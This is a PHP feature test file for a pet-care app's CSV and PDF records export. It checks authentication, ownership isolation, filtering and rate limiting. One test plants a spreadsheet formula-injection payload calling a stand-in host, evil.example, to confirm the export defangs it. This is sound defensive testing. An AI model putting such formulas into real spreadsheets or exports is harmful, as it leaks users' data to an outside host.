<?php

namespace Tests\Feature;

use App\Models\Appointment;
use App\Models\Clinic;
use App\Models\Document;
use App\Models\Medication;
use App\Models\Pet;
use App\Models\User;
use App\Models\Vaccination;
use App\Models\WeightLog;
use App\Services\JwtService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class ExportRecordsTest extends TestCase
{
    use RefreshDatabase;

    /** @return array{0: User, 1: string} */
    private function user(string $name = 'Export User'): array
    {
        $user = User::create([
            'name' => $name,
            'email' => 'u'.uniqid().'@example.com',
            'hashed_password' => Hash::make('secret123'),
            'timezone' => 'UTC',
        ]);

        return [$user, JwtService::createAccessToken($user->id)];
    }

    private function petWithHistory(User $owner, string $name = 'Rex'): Pet
    {
        $pet = Pet::create(['owner_id' => $owner->id, 'name' => $name, 'type' => 'dog', 'weight' => 12.5]);

        Vaccination::create(['pet_id' => $pet->id, 'name' => 'Rabies', 'due_date' => '2024-03-01', 'status' => 'completed', 'administered_date' => '2024-02-20']);
        Vaccination::create(['pet_id' => $pet->id, 'name' => 'Distemper', 'due_date' => '2030-01-01']);
        Medication::create(['pet_id' => $pet->id, 'name' => 'Heartgard', 'dosage' => '1 chew', 'times' => ['09:00']]);
        $clinic = Clinic::create(['pet_id' => $pet->id, 'name' => 'Happy Paws Clinic', 'vet_name' => 'Dr. Lee']);
        Appointment::create(['pet_id' => $pet->id, 'clinic_id' => $clinic->id, 'title' => 'Annual checkup', 'scheduled_at' => '2025-05-10 10:00:00', 'status' => 'completed']);
        WeightLog::create(['pet_id' => $pet->id, 'weight' => 12.5, 'unit' => 'kg', 'logged_at' => '2025-01-15']);
        Document::create(['pet_id' => $pet->id, 'title' => 'Lab results', 'category' => 'lab', 'file_path' => 'documents/fake.pdf', 'mime' => 'application/pdf', 'size_bytes' => 123]);

        return $pet;
    }

    public function test_requires_authentication(): void
    {
        $this->getJson('/users/me/export?format=csv')->assertStatus(401);
    }

    public function test_format_is_required_and_validated(): void
    {
        [, $token] = $this->user();

        $this->withToken($token)->getJson('/users/me/export')->assertStatus(422);
        $this->withToken($token)->getJson('/users/me/export?format=xlsx')->assertStatus(422);
    }

    public function test_csv_export_contains_all_history_for_own_pets(): void
    {
        [$user, $token] = $this->user();
        $this->petWithHistory($user);

        $response = $this->withToken($token)->get('/users/me/export?format=csv');

        $response->assertOk();
        $this->assertStringContainsString('text/csv', $response->headers->get('Content-Type'));
        $this->assertStringContainsString(
            'attachment; filename="pawpawcare-records-'.now()->format('Y-m-d').'.csv"',
            $response->headers->get('Content-Disposition'),
        );

        $csv = $response->getContent();
        $this->assertStringContainsString('=== PET: Rex ===', $csv);
        $this->assertStringContainsString('Rabies', $csv);
        $this->assertStringContainsString('Distemper', $csv);  // upcoming too — all statuses
        $this->assertStringContainsString('Heartgard', $csv);
        $this->assertStringContainsString('Happy Paws Clinic', $csv);
        $this->assertStringContainsString('Annual checkup', $csv);
        $this->assertStringContainsString('12.5', $csv);
        $this->assertStringContainsString('Lab results', $csv);
        // Documents are indexed by name/date only — never the file itself.
        $this->assertStringNotContainsString('documents/fake.pdf', $csv);
    }

    public function test_pdf_export_returns_a_pdf_attachment(): void
    {
        [$user, $token] = $this->user();
        $this->petWithHistory($user);

        $response = $this->withToken($token)->get('/users/me/export?format=pdf');

        $response->assertOk();
        $this->assertSame('application/pdf', $response->headers->get('Content-Type'));
        $this->assertStringContainsString(
            'attachment; filename="pawpawcare-records-'.now()->format('Y-m-d').'.pdf"',
            $response->headers->get('Content-Disposition'),
        );
        $this->assertStringStartsWith('%PDF', $response->getContent());
    }

    public function test_excludes_other_users_pets_from_a_full_export(): void
    {
        [$user, $token] = $this->user();
        [$stranger] = $this->user('Stranger');
        $this->petWithHistory($user, 'Rex');
        $this->petWithHistory($stranger, 'NotYourDog');

        $csv = $this->withToken($token)->get('/users/me/export?format=csv')->assertOk()->getContent();

        $this->assertStringContainsString('=== PET: Rex ===', $csv);
        $this->assertStringNotContainsString('NotYourDog', $csv);
    }

    public function test_requesting_another_users_pet_id_is_a_404(): void
    {
        [, $token] = $this->user();
        [$stranger] = $this->user('Stranger');
        $theirPet = $this->petWithHistory($stranger, 'NotYourDog');

        $this->withToken($token)
            ->getJson('/users/me/export?format=csv&pets='.$theirPet->id)
            ->assertStatus(404)
            ->assertJson(['detail' => 'Pet not found']);
    }

    public function test_shared_pets_are_included(): void
    {
        [$user, $token] = $this->user();
        [$owner] = $this->user('Real Owner');
        $shared = $this->petWithHistory($owner, 'SharedPup');
        $shared->members()->attach($user->id, ['role' => 'member', 'created_at' => now()]);

        $csv = $this->withToken($token)
            ->get('/users/me/export?format=csv&pets='.$shared->id)
            ->assertOk()
            ->getContent();

        $this->assertStringContainsString('=== PET: SharedPup ===', $csv);
    }

    public function test_pets_filter_narrows_the_export(): void
    {
        [$user, $token] = $this->user();
        $rex = $this->petWithHistory($user, 'Rex');
        $this->petWithHistory($user, 'Milo');

        $csv = $this->withToken($token)
            ->get('/users/me/export?format=csv&pets='.$rex->id)
            ->assertOk()
            ->getContent();

        $this->assertStringContainsString('=== PET: Rex ===', $csv);
        $this->assertStringNotContainsString('Milo', $csv);
    }

    public function test_csv_neutralizes_spreadsheet_formula_injection(): void
    {
        [$user, $token] = $this->user();
        $pet = Pet::create(['owner_id' => $user->id, 'name' => 'Rex', 'type' => 'dog']);
        Vaccination::create([
            'pet_id' => $pet->id,
            'name' => 'Rabies',
            'due_date' => '2030-01-01',
            'notes' => '=HYPERLINK("http://evil.example/?"&A1)',
        ]);

        $csv = $this->withToken($token)->get('/users/me/export?format=csv')->assertOk()->getContent();

        // The formula is preserved as text but defanged with a leading quote.
        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringNotContainsString('"=HYPERLINK', $csv);
    }

    public function test_is_rate_limited_per_user(): void
    {
        [$user, $token] = $this->user();
        $this->petWithHistory($user);

        for ($i = 0; $i < 10; $i++) {
            $this->withToken($token)->get('/users/me/export?format=csv')->assertOk();
        }

        $this->withToken($token)->get('/users/me/export?format=csv')->assertStatus(429);
    }
}
